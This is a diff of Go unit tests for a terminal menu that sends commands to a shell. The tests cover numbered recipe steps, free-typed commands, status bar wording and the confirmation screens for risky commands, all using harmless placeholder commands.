@@ -225,7 +225,7 @@ func TestMenuLocksWhileShellIsBusy(t *testing.T) {
 	if m.busy != "Edit a pack" {
 		t.Fatalf("menu should lock while it runs, busy=%q", m.busy)
 	}
-	if bar := ansi.Strip(m.statusBar(60)); strings.Contains(bar, "is running") {
+	if bar := ansi.Strip(m.barBody(60)); strings.Contains(bar, "is running") {
 		t.Errorf("a command that's just started shouldn't flash the band, got %q", bar)
 	}
 	m.Update(busyGraceMsg{})
@@ -236,7 +236,7 @@ func TestMenuLocksWhileShellIsBusy(t *testing.T) {
 	if cmd, _ := m.details(); !strings.Contains(ansi.Strip(cmd), "ls") {
 		t.Errorf("the Command area still shows what it would run, got %q", cmd)
 	}
-	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "⏳ Edit a pack is running") {
+	if bar := ansi.Strip(m.barBody(60)); !strings.Contains(bar, "⏳ Edit a pack is running") {
 		t.Errorf("the status bar should say so, got %q", bar)
 	}
 	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
@@ -269,7 +269,7 @@ func TestShellWarningClearsWithoutFocus(t *testing.T) {
 	if look == nil {
 		t.Fatal("a warning should keep the shell being looked at")
 	}
-	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "middle of a command") {
+	if bar := ansi.Strip(m.barBody(60)); !strings.Contains(bar, "middle of a command") {
 		t.Fatalf("the bar should warn, got %q", bar)
 	}
 	if _, again := m.Update(tea.BlurMsg{}); again != nil {
@@ -284,7 +284,7 @@ func TestShellWarningClearsWithoutFocus(t *testing.T) {
 	if _, cmd := m.Update(shellLookMsg{}); cmd != nil || m.looking {
 		t.Fatal("nothing to warn of: it should stop looking")
 	}
-	if bar := ansi.Strip(m.statusBar(60)); strings.Contains(bar, "middle of a command") {
+	if bar := ansi.Strip(m.barBody(60)); strings.Contains(bar, "middle of a command") {
 		t.Fatalf("the warning should be gone, got %q", bar)
 	}
 
@@ -379,7 +379,7 @@ func TestNumberKeysNumberCommands(t *testing.T) {
 	endsIn("A name far", "1")
 	endsIn("List s3", "")
 	endsIn("Who am I", "")
-	press("2") // no step 1 without it: nothing changes
+	press("3") // past the next free step: nothing changes
 	endsIn("A name far", "1")
 
 	// Numbers carry across sections, into search, and through a reload.
@@ -429,7 +429,7 @@ func TestNumberingEndsTheChainThere(t *testing.T) {
 	}
 	on("a", "5") // nothing yet: it has to start at 1
 	chain("")
-	if !strings.Contains(m.hint, "up to step 1") {
+	if !strings.Contains(m.hint, "up to position 1") {
 		t.Errorf("a refused number should say why, got %q", m.hint)
 	}
 	for i, name := range strings.Split("a b c d e f g h i", " ") {
@@ -452,19 +452,249 @@ func TestNumberingEndsTheChainThere(t *testing.T) {
 	chain("1a 2c")
 	on("a", "1")
 	chain("1c")
-	on("c", "2") // it would leave step 1 empty: refused
-	chain("1c")
-	if !strings.Contains(m.hint, "up to step 1") {
-		t.Errorf("it can only be step 1, got %q", m.hint)
-	}
-
+	on("c", "2") // another number repeats it: step 1 stays
+	chain("1c 2c")
 	on("d", "2")
 	on("e", "3")
-	on("c", "2") // moving down: it leaves its step, the rest close up, then it ends the chain
-	chain("1d 2c")
+	on("c", "2") // it takes 2, keeps its 1, and ends the chain
+	chain("1c 2c")
 	on("e", "3")
-	on("e", "1") // moving up: the same
+	on("e", "1") // an earlier number takes that step and ends the chain there
 	chain("1e")
+}
+
+// A command can be several steps: its row shows each, ascending, and each
+// number only touches its own step.
+func TestRepeatedSteps(t *testing.T) {
+	var sent []string
+	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{
+		{Name: "pull", Cmd: "git pull"}, {Name: "status", Cmd: "git status"},
+	}}}}, Send: func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true },
+		Shell: func() ShellState { return ShellState{} },
+		Builtin: func() []*config.Section {
+			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
+		}})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	m.showSection(&m.opt.Config.Sections[0])
+	on := func(name, key string) {
+		t.Helper()
+		i := slices.IndexFunc(m.list.view, func(it item) bool { return it.title == name })
+		if i < 0 {
+			t.Fatalf("no row %q", name)
+		}
+		m.list.cursor = i
+		m.Update(typed(key))
+	}
+	steps := func() string {
+		var got []string
+		for _, s := range m.recipe {
+			got = append(got, s.ref.cmd.Name)
+		}
+		return strings.Join(got, " ")
+	}
+	badges := func(name string) string {
+		t.Helper()
+		const width = 40
+		for _, it := range m.list.view {
+			if it.title == name {
+				row := ansi.Strip(m.list.row(it, false, width))
+				if ansi.StringWidth(row) > width {
+					t.Errorf("row is wider than the list: %q", row)
+				}
+				return strings.Join(strings.Fields(strings.TrimPrefix(strings.TrimSpace(row), name)), " ")
+			}
+		}
+		t.Fatalf("no row %q", name)
+		return ""
+	}
+
+	on("status", "1")
+	on("pull", "2")
+	on("status", "3")
+	if steps() != "status pull status" || badges("status") != "1 3" || badges("pull") != "2" {
+		t.Fatalf("steps %q, status %q, pull %q", steps(), badges("status"), badges("pull"))
+	}
+	on("status", "4") // more of the same stays in order
+	if badges("status") != "1 3 4" {
+		t.Errorf("badges should ascend, got %q", badges("status"))
+	}
+	on("status", "3") // only that step goes
+	if steps() != "status pull status" || badges("status") != "1 3" {
+		t.Errorf("steps %q, status %q", steps(), badges("status"))
+	}
+	on("status", "1") // the first of them: the rest close up
+	if steps() != "pull status" || badges("status") != "2" {
+		t.Errorf("steps %q, status %q", steps(), badges("status"))
+	}
+
+	// In the recipe's own list a row is one step, with one number.
+	on("status", "3")
+	m.Update(typed("r"))
+	var rows []string
+	for _, it := range m.list.view {
+		if s := m.itemSteps(it); len(s) > 0 {
+			rows = append(rows, fmt.Sprint(s, it.title))
+		}
+	}
+	if got := strings.Join(rows, " "); got != "[1]pull [2]status [3]status" {
+		t.Errorf("rows = %q", got)
+	}
+	on("status", "4") // the first status row adds another, like anywhere else
+	if steps() != "pull status status status" {
+		t.Errorf("steps %q", steps())
+	}
+
+	// All nine on one row, in a narrow list: still ascending, and inside it.
+	row, w := stepBadges([]int{1, 2, 3, 4, 5, 6, 7, 8, 9}, 20)
+	if got := ansi.Strip(row); got != " 1   2   3   4  …" || ansi.StringWidth(got) != w {
+		t.Errorf("got %q, width %d", got, w)
+	}
+	if one, w := stepBadges([]int{7}, 1); ansi.Strip(one) != " 7 " || w != stepW {
+		t.Errorf("one badge should always show, got %q width %d", one, w)
+	}
+}
+
+func commandLineModel(t *testing.T, saved *[]config.Recipe, sent *[]string) (*Model, *config.Section) {
+	t.Helper()
+	free := &config.Section{Name: CommandLineSection, Icon: "•", Category: config.CommandLine, Groups: []config.Group{{Name: "Custom", Commands: []config.Command{
+		{ID: CommandLineID, Name: "Type a command", Cmd: "<command>", Args: []config.Arg{{Name: "command"}}},
+	}}}}
+	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "status", Cmd: "git status"}}}}},
+		Reload: func() (*config.Config, error) { return nil, nil }, // nothing changed
+		Send:   func(c string) error { *sent = append(*sent, c); return nil }, WaitIdle: func() bool { return true },
+		Shell: func() ShellState { return ShellState{} }, Self: "clingon",
+		Recipes: func() []config.Recipe { return *saved },
+		Builtin: func() []*config.Section {
+			return []*config.Section{free, {Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
+		}})
+	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
+	return m, free
+}
+
+// Type a command is numbered like any other, and asks when the recipe reaches it.
+func TestTypeACommandInARecipe(t *testing.T) {
+	const sortCmd = `sort < in.txt | echo "it's"`
+	var saved []config.Recipe
+	var sent []string
+	m, free := commandLineModel(t, &saved, &sent)
+	enter := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyEnter}) }
+	right := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyRight}) }
+	idle := func() { t.Helper(); m.Update(idleMsg{seq: m.run.seq, ok: true}) }
+	keys := func() string {
+		var got []string
+		for _, s := range m.recipe {
+			got = append(got, s.key)
+		}
+		return strings.Join(got, " ")
+	}
+	on := func(name string) {
+		t.Helper()
+		i := slices.IndexFunc(m.list.view, func(it item) bool { return it.title == name })
+		if i < 0 {
+			t.Fatalf("no row %q", name)
+		}
+		m.list.cursor = i
+	}
+
+	// A number just adds it: nothing asks yet.
+	m.showSection(free)
+	on("Type a command")
+	m.Update(typed("1"))
+	if m.mode != modeBrowse || keys() != CommandLineID {
+		t.Fatalf("mode %v, keys %q", m.mode, keys())
+	}
+	m.showSection(&m.opt.Config.Sections[0])
+	on("status")
+	m.Update(typed("2"))
+	statusID := m.recipe[1].key
+	m.showSection(free)
+	on("Type a command")
+	m.Update(typed("3"))
+	if got := m.itemSteps(m.list.view[m.list.cursor]); !slices.Equal(got, []int{1, 3}) {
+		t.Errorf("the row should show both its steps, got %v", got)
+	}
+	m.Update(typed("3")) // its own number takes that step off
+	if m.mode != modeBrowse || keys() != CommandLineID+" "+statusID {
+		t.Fatalf("mode %v, keys %q", m.mode, keys())
+	}
+	m.Update(typed("3"))
+	if got := m.saveCommand("name"); got != "clingon recipe save name "+CommandLineID+" "+statusID+" "+CommandLineID {
+		t.Errorf("save = %q", got)
+	}
+
+	// Each one asks when the recipe gets to it, and what's typed goes as typed.
+	m.Update(typed("r"))
+	on("Run recipe")
+	right() // Save first?
+	right() // No
+	if m.mode != modeFill || len(sent) != 0 {
+		t.Fatalf("step 1 should ask: mode %v, sent %q", m.mode, sent)
+	}
+	m.Update(typed(sortCmd))
+	enter()
+	if !slices.Equal(sent, []string{sortCmd}) {
+		t.Fatalf("sent %q", sent)
+	}
+	idle() // on to status, with nothing to ask
+	if !slices.Equal(sent, []string{sortCmd, "git status"}) {
+		t.Fatalf("sent %q", sent)
+	}
+	idle()
+	if m.mode != modeFill {
+		t.Fatalf("step 3 should ask again, not reuse step 1: mode %v", m.mode)
+	}
+	if v := m.job.input.Value(); v != "" {
+		t.Errorf("step 3 should start empty, got %q", v)
+	}
+	m.Update(typed("echo hello world"))
+	enter()
+	idle()
+	if m.run != nil || !slices.Equal(sent, []string{sortCmd, "git status", "echo hello world"}) {
+		t.Errorf("run %+v, sent %q", m.run, sent)
+	}
+
+	// Saved, it finds the command again, and asks again.
+	sent, saved = nil, []config.Recipe{{Name: "Asks", Steps: []string{CommandLineID}}}
+	m.Update(typed("x"))
+	m.Update(typed("r"))
+	on("Asks")
+	right()
+	right() // Run
+	if m.errMsg != "" || m.mode != modeFill || len(sent) != 0 {
+		t.Fatalf("err %q, mode %v, sent %q", m.errMsg, m.mode, sent)
+	}
+	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
+	m.run = nil
+
+	// A reload keeps it, while a command whose pack went leaves the recipe.
+	m.recipe = nil
+	m.showSection(free)
+	on("Type a command")
+	m.Update(typed("1"))
+	sec := &m.opt.Config.Sections[0]
+	m.recipe = append(m.recipe, recipeStep{statusID, cmdRef{"Git", sec, &sec.Commands[0]}})
+	m.opt.Reload = func() (*config.Config, error) { return &config.Config{}, nil } // Git's pack has gone
+	if !m.reload() {
+		t.Fatal("expected a reload")
+	}
+	if keys() != CommandLineID {
+		t.Errorf("keys %q", keys())
+	}
+}
+
+// Enter on the row runs what's typed once, keeping nothing, exactly as typed.
+func TestTypeACommandOnce(t *testing.T) {
+	var saved []config.Recipe
+	var sent []string
+	m, free := commandLineModel(t, &saved, &sent)
+	m.showSection(free)
+	m.list.cursor = slices.IndexFunc(m.list.view, func(it item) bool { return it.title == "Type a command" })
+	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+	m.Update(typed(`echo "hi there" > <out>`))
+	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+	if !slices.Equal(sent, []string{`echo "hi there" > <out>`}) || len(m.recipe) != 0 {
+		t.Errorf("sent %q, recipe %v", sent, m.recipe)
+	}
 }
 
 // The filter opens with /, so letters and digits have a job only once it has.
@@ -521,13 +751,15 @@ func TestSlashOpensTheFilter(t *testing.T) {
 		t.Error("? is text while filtering")
 	}
 
-	// / again closes it, clearing what's typed. It only does that as a key of
+	// / again closes it, keeping what's typed. It only does that as a key of
 	// its own: in pasted text it's part of the search.
 	press("/")
-	queryIs("")
+	queryIs("ec2?")
 	if m.list.filtering {
 		t.Error("a second / should stop filtering")
 	}
+	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
+	queryIs("")
 	press("/")
 	m.Update(tea.PasteMsg{Content: "a/b"})
 	queryIs("a/b")
@@ -538,6 +770,7 @@ func TestSlashOpensTheFilter(t *testing.T) {
 	if m.list.filtering || m.section != nil {
 		t.Errorf("/ should only stop filtering: filtering %v, section %v", m.list.filtering, m.section)
 	}
+	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
 	press("/")
 	press("ec2")
 
@@ -665,7 +898,11 @@ func TestCurrentRecipeListsTheSteps(t *testing.T) {
 		var got []string
 		for _, it := range m.list.view {
 			if !it.header {
-				got = append(got, fmt.Sprintf("%d%s", m.itemStep(it), it.title))
+				n := 0
+				if steps := m.itemSteps(it); len(steps) > 0 {
+					n = steps[0]
+				}
+				got = append(got, fmt.Sprintf("%d%s", n, it.title))
 			}
 		}
 		return strings.Join(got, " ")
@@ -688,8 +925,8 @@ func TestCurrentRecipeListsTheSteps(t *testing.T) {
 	press("2") // c
 	m.Update(tea.KeyPressMsg{Code: tea.KeyUp})
 	press("3") // b
-	if bar := ansi.Strip(m.statusBar(80)); !strings.HasPrefix(strings.TrimSpace(bar), "r recipe  1  a") {
-		t.Errorf("the bar should offer the key, got %q", bar)
+	if bar := ansi.Strip(m.barBody(80)); !strings.HasPrefix(strings.TrimSpace(bar), "r recipe · x clear  1  a") {
+		t.Errorf("the bar should offer the keys, got %q", bar)
 	}
 	press("r")
 	if rows() != "0Run recipe 1a 2c 3b" {
@@ -715,7 +952,7 @@ func TestCurrentRecipeListsTheSteps(t *testing.T) {
 	if it := m.list.selected(); it == nil || it.title != "b" {
 		t.Errorf("the cursor should stay put, at %+v", it)
 	}
-	press("3") // past what's left: refused
+	press("4") // past what's left: refused
 	if rows() != "0Run recipe 1a 2b" {
 		t.Fatalf("rows = %q", rows())
 	}
@@ -764,12 +1001,12 @@ func TestRunningARecipe(t *testing.T) {
 		{Name: "two", Cmd: "two"},
 	}
 	var sent []string
-	failed := false
+	failed, known := false, true
 	shell := ShellState{}
 	m := New(Options{
 		Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: cmds}}},
 		Send:   func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true },
-		LastFailed: func() bool { return failed }, Shell: func() ShellState { return shell },
+		LastFailed: func() (bool, bool) { return failed, known }, Shell: func() ShellState { return shell },
 		Builtin: func() []*config.Section {
 			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
 		}})
@@ -795,7 +1032,7 @@ func TestRunningARecipe(t *testing.T) {
 		sent, m.errMsg, m.hint = nil, "", ""
 	}
 	right := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyRight}) }
-	start := func() { t.Helper(); m.Update(typed("r")); right() }
+	start := func() { t.Helper(); m.Update(typed("r")); on("Run recipe"); right() }
 	done := func(ok bool) { t.Helper(); m.Update(idleMsg{seq: m.run.seq, ok: ok}) }
 	sentIs := func(want string) {
 		t.Helper()
@@ -814,12 +1051,12 @@ func TestRunningARecipe(t *testing.T) {
 	}
 	sentIs("other two")
 	m.Update(typed("r"))
-	on("one") // in the recipe's own list too
+	on("two") // in the recipe's own list, it's the recipe from there
 	right()
-	m.Update(idleMsg{seq: m.runSeq, ok: true})
-	sentIs("other two one")
+	done(true)
+	sentIs("other two two")
 	if m.run != nil || len(m.recipe) != 2 {
-		t.Fatalf("running one shouldn't touch the recipe: run %+v, recipe %v", m.run, m.recipe)
+		t.Fatalf("that shouldn't touch the recipe: run %+v, recipe %v", m.run, m.recipe)
 	}
 	sent = nil
 
@@ -828,7 +1065,7 @@ func TestRunningARecipe(t *testing.T) {
 	if m.details(); m.list.selected().title != "Run recipe" {
 		t.Fatalf("r should land on Run recipe, at %+v", m.list.selected())
 	}
-	if _, desc := m.details(); !strings.Contains(desc, "Runs 2 steps in order") {
+	if _, desc := m.details(); !strings.Contains(desc, "Runs 2 commands in order") {
 		t.Errorf("it should say what it does, got %q", desc)
 	}
 	right()
@@ -847,7 +1084,7 @@ func TestRunningARecipe(t *testing.T) {
 	if m.run != nil || len(m.recipe) != 2 {
 		t.Fatalf("a finished recipe stays: run %+v, recipe %v", m.run, m.recipe)
 	}
-	if !strings.Contains(m.hint, "finished: 2 steps") {
+	if !strings.Contains(m.hint, "finished: 2 commands") {
 		t.Errorf("hint = %q", m.hint)
 	}
 	start() // and runs again
@@ -873,13 +1110,13 @@ func TestRunningARecipe(t *testing.T) {
 	done(true)
 	failed = false
 	sentIs("one bad")
-	if m.run != nil || len(m.recipe) != 3 || !strings.Contains(m.errMsg, "step 2, bad: it failed") {
+	if m.run != nil || len(m.recipe) != 3 || !strings.Contains(m.errMsg, "command 2, bad: it failed") {
 		t.Fatalf("run %+v, recipe %v, err %q", m.run, m.recipe, m.errMsg)
 	}
 	start() // and it can go again, from the top
 	sentIs("one bad one")
-	m.Update(typed("x")) // x stops it, with what's running left to finish
-	if m.run != nil || len(m.recipe) != 0 || !strings.Contains(m.hint, "stopped and cleared") {
+	m.Update(typed("x")) // x clears it, with what's running left to finish
+	if m.run != nil || len(m.recipe) != 0 || !strings.Contains(m.hint, "Recipe cleared") {
 		t.Fatalf("run %+v, recipe %v, hint %q", m.run, m.recipe, m.hint)
 	}
 	m.Update(idleMsg{seq: m.runSeq, ok: true})
@@ -905,7 +1142,7 @@ func TestRunningARecipe(t *testing.T) {
 	start()
 	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
 	sentIs("")
-	if m.run != nil || m.mode != modeBrowse || len(m.recipe) != 2 || !strings.Contains(m.hint, "stopped at step 1") {
+	if m.run != nil || m.mode != modeBrowse || len(m.recipe) != 2 || !strings.Contains(m.hint, "stopped at command 1") {
 		t.Fatalf("run %+v, mode %v, recipe %v, hint %q", m.run, m.mode, m.recipe, m.hint)
 	}
 
@@ -916,15 +1153,15 @@ func TestRunningARecipe(t *testing.T) {
 	if m.mode != modeConfirm {
 		t.Fatalf("a risky step should ask, mode %v", m.mode)
 	}
-	m.Update(typed("n"))
+	answer(m, false)
 	sentIs("one")
-	if m.run != nil || len(m.recipe) != 3 || !strings.Contains(m.hint, "stopped at step 2") {
+	if m.run != nil || len(m.recipe) != 3 || !strings.Contains(m.hint, "stopped at command 2") {
 		t.Fatalf("run %+v, hint %q", m.run, m.hint)
 	}
 	// "yes" goes on.
 	start()
 	done(true)
-	m.Update(typed("y"))
+	answer(m, true)
 	sentIs("one one risky")
 	done(true)
 	sentIs("one one risky two")
@@ -1052,20 +1289,25 @@ func TestFillInNamesTheCommand(t *testing.T) {
 	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
 	lines := func(w, h int) []string { return strings.Split(ansi.Strip(m.fillView(w, h)), "\n") }
 	got := lines(60, 20)
-	if got[0] != "BIGGEST THINGS HERE" || got[1] != "" || !strings.HasPrefix(got[2], "count  1/2") || !strings.HasPrefix(got[3], "❯") {
-		t.Errorf("name, a blank line, then the arg and its input:\n%q", got[:4])
+	row := func(l string) string { return strings.TrimSpace(strings.TrimPrefix(l, "▌")) }
+	if row(got[0]) != "Step 1 of 2" || got[1] != "" || row(got[2]) != "count (type)" || !strings.HasPrefix(row(got[3]), "❯") || strings.Contains(strings.Join(got, "\n"), "BIGGEST") {
+		t.Errorf("how far along alone, then the blank with its input, and no heading:\n%q", got[:4])
 	}
-	if head := lines(10, 20)[0]; ansi.StringWidth(head) > 10 || !strings.HasSuffix(head, "…") {
-		t.Errorf("a long name should fit: %q", head)
+	// Only your answer is in the panel: it has the edge, and fills the width.
+	if strings.HasPrefix(got[0], "▌") || strings.HasPrefix(got[2], "▌") || !strings.HasPrefix(got[3], "▌") || ansi.StringWidth(got[3]) != 60 {
+		t.Errorf("panel: %q", got[:4])
 	}
-	if got := lines(60, 5); !strings.HasPrefix(got[0], "count") {
-		t.Errorf("no room: the input matters more than the name: %q", got)
+	if head := lines(10, 20)[0]; ansi.StringWidth(head) > 10 {
+		t.Errorf("a narrow panel should fit: %q", head)
+	}
+	if got := lines(60, 5); !strings.HasPrefix(row(got[0]), "count (type)  Step 1 of 2") {
+		t.Errorf("no room: the blank and how far along on one line: %q", got)
 	}
 
 	// A pick list keeps its rows in the height it's given, header and all.
 	m.Update(typed("3"))
 	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
-	if got := lines(60, 8); got[0] != "BIGGEST THINGS HERE" || !strings.HasPrefix(got[2], "kind  2/2") || len(got) > 8 {
+	if got := lines(60, 8); got[0] != "❯ / to filter" || got[1] != "" || row(got[2]) != "Step 2 of 2" || got[3] != "" || row(got[4]) != "kind (↑↓ to choose)" || !strings.Contains(got[5], "x") || len(got) > 8 {
 		t.Errorf("pick list: %q", got)
 	}
 	m.Update(tea.KeyPressMsg{Code: tea.KeyLeft})
@@ -1084,11 +1326,8 @@ func TestFillInNamesTheCommand(t *testing.T) {
 	m.Update(typed("r"))
 	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
 	m.Update(idleMsg{seq: m.run.seq, ok: true})
-	if head := lines(60, 20)[0]; head != "BIGGEST THINGS HERE · step 2 of 2" {
+	if head := row(lines(60, 20)[0]); head != "Recipe command 2 of 2 · Step 1 of 2" {
 		t.Errorf("head = %q", head)
-	}
-	if head := lines(20, 20)[0]; ansi.StringWidth(head) > 20 || !strings.HasSuffix(head, " · step 2 of 2") {
-		t.Errorf("a long name gives way to the step: %q", head)
 	}
 }
 
@@ -1115,28 +1354,28 @@ func TestRiskyScreensNameTheCommand(t *testing.T) {
 	on("Stop it")
 	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
 	got := lines(20)
-	if got[0] != "STOP IT" || got[1] != "" || !strings.Contains(got[2], "This command is risky") {
+	if !strings.Contains(got[0], "This command is risky") || strings.HasPrefix(got[0], "▌") || !strings.HasPrefix(got[2], "▌") || !strings.HasPrefix(got[3], "▌") || strings.Contains(strings.Join(got, "\n"), "STOP IT") {
 		t.Errorf("warn: %q", got)
 	}
 	if got := lines(5); !strings.Contains(got[0], "This command is risky") || len(got) != 4 {
 		t.Errorf("no room: the question and answers come first: %q", got)
 	}
-	m.Update(typed("n"))
+	answer(m, false)
 
 	// A dangerous one, through both of its screens.
 	on("Burn it")
 	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
 	got = lines(20)
-	if got[0] != "BURN IT" || got[1] != "" || got[2] != "burn" || !strings.Contains(got[4], dangerGlyph+" It can't be undone") {
+	if !strings.Contains(got[0], "burn") || !strings.Contains(got[2], dangerGlyph+" It can't be undone") {
 		t.Errorf("danger: %q", got)
 	}
 	m.Update(typed(m.pending.code))
 	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
 	got = lines(20)
-	if got[0] != "BURN IT" || !strings.Contains(got[2], "Last check") {
+	if !strings.Contains(got[0], "Last check") {
 		t.Errorf("last check: %q", got)
 	}
-	m.Update(typed("n"))
+	answer(m, false)
 	m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
 	m.mode, m.pending = modeBrowse, nil
 
@@ -1148,7 +1387,7 @@ func TestRiskyScreensNameTheCommand(t *testing.T) {
 	m.Update(typed("r"))
 	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
 	m.Update(idleMsg{seq: m.run.seq, ok: true})
-	if got := lines(20); got[0] != "STOP IT · step 2 of 2" {
+	if got := lines(20); !strings.Contains(got[0], "Recipe command 2 of 2") || got[1] != "" || !strings.Contains(got[2], "risky") {
 		t.Errorf("as a step: %q", got)
 	}
 }
@@ -1163,10 +1402,10 @@ func TestStatusBarShowsTheRecipe(t *testing.T) {
 		{Name: "Nope", Icon: "•", Category: config.Other, Needs: []string{"clingon-test-nope"}, Commands: []config.Command{{Name: "Go", Cmd: "x"}}},
 	}}, Send: func(string) error { return nil }, Shell: func() ShellState { return shell }})
 	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
-	m.news = &Headline{Text: "✓ some news"}
+	m.news = &Headline{Kind: Attention, Text: "✓ some news"}
 	barIs := func(w int, want string) {
 		t.Helper()
-		line := m.statusBar(w)
+		line := m.barBody(w)
 		if got := strings.TrimSpace(ansi.Strip(line)); got != want {
 			t.Errorf("at %d cells: got %q, want %q", w, got, want)
 		}
@@ -1201,11 +1440,11 @@ func TestStatusBarShowsTheRecipe(t *testing.T) {
 
 	// Missing tools aren't hidden by it: they share the bar.
 	m.showSection(&m.opt.Config.Sections[2])
-	line := ansi.Strip(m.statusBar(120))
+	line := ansi.Strip(m.barBody(120))
 	if !strings.Contains(line, "✗ Needs clingon-test-nope") || !strings.Contains(line, want) {
 		t.Errorf("both should show, got %q", line)
 	}
-	if got := ansi.StringWidth(m.statusBar(120)); got != 120 {
+	if got := ansi.StringWidth(m.barBody(120)); got != 120 {
 		t.Errorf("the split bar should be 120 cells wide, got %d", got)
 	}
 
@@ -1232,7 +1471,7 @@ func TestTypedShellAsksFirst(t *testing.T) {
 	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
 	m.Update(tea.FocusMsg{})
 	m.showSection(&m.opt.Config.Sections[0])
-	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "Typed in the shell: git sta") {
+	if bar := ansi.Strip(m.barBody(60)); !strings.Contains(bar, "Typed in the shell: git sta") {
 		t.Errorf("the status bar should say what's typed, got %q", bar)
 	}
 	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
@@ -1244,7 +1483,7 @@ func TestTypedShellAsksFirst(t *testing.T) {
 		t.Fatalf("No goes to the shell and sends nothing: focused %d sent %v", focused, sent)
 	}
 	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
-	m.Update(typed("y")) // Yes, clear it and run
+	answer(m, true) // Yes, clear it and run
 	if cleared != 1 || len(sent) != 1 || sent[0] != "ls" {
 		t.Fatalf("Yes clears the prompt, then sends: cleared %d sent %v", cleared, sent)
 	}
@@ -1263,7 +1502,7 @@ func TestScrolledBackShellHoldsCommands(t *testing.T) {
 	if len(sent) != 0 || m.list.selected().disabled {
 		t.Fatal("nothing can be sent into a scrolled-back shell, though the row isn't greyed")
 	}
-	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "scrolled back") {
+	if bar := ansi.Strip(m.barBody(60)); !strings.Contains(bar, "scrolled back") {
 		t.Errorf("the status bar should say why, got %q", bar)
 	}
 	shell = ShellState{}
@@ -1323,7 +1562,7 @@ func TestStatusBarSaysWhenAToolIsMissing(t *testing.T) {
 	m := New(Options{Config: cfg, Dir: func() string { return t.TempDir() }, Headline: func() Headline { return news }})
 	m.Update(tea.WindowSizeMsg{Width: 200, Height: 40})
 	bar := func() string {
-		b := m.statusBar(200)
+		b := m.barBody(200)
 		if ansi.StringWidth(b) != 200 {
 			t.Errorf("the bar should fill the width, got %d", ansi.StringWidth(b))
 		}
@@ -1332,14 +1571,98 @@ func TestStatusBarSaysWhenAToolIsMissing(t *testing.T) {
 	if bar() != news.Text { // the top level has news; missing tools are for sections
 		t.Errorf("top menu: got %q, want %q", bar(), news.Text)
 	}
-	for i, want := range []string{"✗ Needs clingon-test-nope (not installed)", "✗ Needs clingon-test-gopls (not on PATH: it's in ~/go/bin)", "✓ Everything Shell needs is installed"} {
+	for i, want := range []string{"✗ Needs clingon-test-nope (not installed)", "✗ Needs clingon-test-gopls (not on PATH: it's in ~/go/bin)", "→ go · ← back · / filter · [ ] jump"} {
 		m.showSection(&cfg.Sections[i])
 		if bar() != want {
 			t.Errorf("%s: got %q, want %q", cfg.Sections[i].Name, bar(), want)
 		}
 	}
-	if !strings.HasSuffix(strings.TrimSpace(ansi.Strip(m.view())), "✓ Everything Shell needs is installed") {
-		t.Error("the status bar should be the last line, under the key hints")
+	if !strings.HasSuffix(strings.TrimSpace(ansi.Strip(m.view())), "→ go · ← back · / filter · [ ] jump") {
+		t.Error("the status bar should be the last line")
+	}
+}
+
+// The bar shows the keys when it has nothing better to say, and they're the
+// ones that work where you are.
+func TestStatusBarShowsTheKeys(t *testing.T) {
+	sections := []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "a", Cmd: "a"}, {Name: "r", Cmd: "r", Risk: config.RiskWarn}}}}
+	m := New(Options{Config: &config.Config{Sections: sections}, Send: func(string) error { return nil }, FocusMenu: func() {},
+		WaitIdle: func() bool { return true }, Shell: func() ShellState { return ShellState{} },
+		Builtin: func() []*config.Section {
+			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
+		}})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	barIs := func(when, want string) {
+		t.Helper()
+		line := m.statusBar(120)
+		if got := strings.TrimSpace(ansi.Strip(line)); got != strings.TrimSpace(" ? help  "+want) {
+			t.Errorf("%s: bar %q, want %q", when, got, want)
+		}
+		if w := ansi.StringWidth(line); w != 120 {
+			t.Errorf("%s: bar is %d wide", when, w)
+		}
+	}
+	footIs := func(when, want string) {
+		t.Helper()
+		if got := ansi.Strip(m.footer(60)); got != want {
+			t.Errorf("%s: footer %q, want %q", when, got, want)
+		}
+	}
+	barIs("top", "→ go · / filter · [ ] jump · esc quit · r recipe · tab shell")
+	footIs("top", "")
